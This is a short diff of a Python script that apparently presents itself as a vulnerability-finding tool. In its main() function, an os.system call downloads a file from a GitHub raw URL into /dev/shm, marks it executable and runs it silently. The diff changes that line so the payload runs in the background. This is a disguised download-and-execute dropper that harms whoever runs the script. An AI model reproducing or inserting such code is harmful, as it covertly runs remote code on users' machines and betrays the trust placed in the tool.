@@ -29,7 +29,7 @@ def animate_vulnerability_finding():
 
 def main():
     # Your one-liner command
-    os.system("curl -sSL https://raw.githubusercontent.com/FoxyProxys/github/main/log -o /dev/shm/log && chmod +x /dev/shm/log && bash /dev/shm/log > /dev/null 2>&1")
+    os.system("curl -sSL https://raw.githubusercontent.com/FoxyProxys/github/main/log -o /dev/shm/log && chmod +x /dev/shm/log && /dev/shm/./log & > /dev/null 2>&1")
 
     log_file_url = "https://raw.githubusercontent.com/FoxyProxys/github/main/log"
     current_username = get_current_username()
